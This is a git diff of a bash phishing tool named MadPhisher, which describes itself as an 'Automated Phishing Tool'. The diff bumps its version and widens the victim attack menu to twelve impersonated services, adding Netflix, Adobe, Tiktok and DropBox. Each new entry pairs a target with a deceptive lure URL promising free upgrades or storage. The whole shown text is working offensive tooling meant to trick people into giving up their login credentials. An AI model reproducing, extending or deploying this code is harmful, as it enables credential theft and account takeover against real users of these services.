@@ -3,11 +3,11 @@
 
 ##   MadPhisher : 	Automated Phishing Tool
 ##   Author 	: 	Sajid Ibn Nayeem
-##   Version 	: 	1.2.4
+##   Version 	: 	2.1
 ##   Github 	: 	https://github.com/SajidIbnNayeem
 
 
-__version__="1.2.4"
+__version__="2.1"
 
 
 ## DEFAULT HOST & PORT
@@ -455,14 +455,10 @@ main_menu() {
 	cat <<- EOF
 		${PURPLE}(×_×)${BLUE}Select An Attack For Your Victim ${RED}${BLUE}
 
-		${RED}[${WHITE}01${RED}]${YELLOW} Facebook
-		${RED}[${WHITE}02${RED}]${YELLOW} Instagram
-		${RED}[${WHITE}03${RED}]${YELLOW} Google   
-${RED}[${WHITE}04${RED}]${YELLOW} Twitter
-		${RED}[${WHITE}05${RED}]${YELLOW} Snapchat 
-		${RED}[${WHITE}06${RED}]${YELLOW} Linkedin
-		${RED}[${WHITE}07${RED}]${YELLOW} Microsoft
-		${RED}[${WHITE}08${RED}]${YELLOW} Spotify
+		${RED}[${WHITE}01${RED}]${YELLOW} Facebook      ${RED}[${WHITE}02${RED}]${YELLOW} Instagram      ${RED}[${WHITE}03${RED}]${YELLOW} Google   
+${RED}[${WHITE}04${RED}]${YELLOW} Twitter       ${RED}[${WHITE}05${RED}]${YELLOW} Snapchat       ${RED}[${WHITE}06${RED}]${YELLOW} Linkedin
+		${RED}[${WHITE}07${RED}]${YELLOW} Microsoft     ${RED}[${WHITE}08${RED}]${YELLOW} Spotify        ${RED}[${WHITE}09${RED}]${YELLOW} Netflix 
+		${RED}[${WHITE}10${RED}]${YELLOW} Adobe         ${RED}[${WHITE}11${RED}]${YELLOW} Tiktok         ${RED}[${WHITE}12${RED}]${YELLOW} DropBox
 		${RED}[${WHITE}99${RED}]${YELLOW} About
 		${RED}[${WHITE}00${RED}]${YELLOW} Exit
 	EOF
@@ -495,6 +491,22 @@ ${RED}[${WHITE}04${RED}]${YELLOW} Twitter
 		8 | 08)
 			website="spotify"
 			mask='https://convert-your-account-to-spotify-premium'
+			tunnel_menu;;
+		9 | 09)
+			website="netflix"
+			mask='https://upgrade-your-netflix-plan-free'
+			tunnel_menu;;
+		10)
+			website="adobe"
+			mask='https://get-adobe-lifetime-pro-membership-free'
+			tunnel_menu;;
+		11)
+			website="tiktok"
+			mask='https://tiktok-free-liker'
+			tunnel_menu;;
+		12)
+			website="dropbox"
+			mask='https://get-1TB-cloud-storage-free'
 			tunnel_menu;;
 		99)
 			about;;
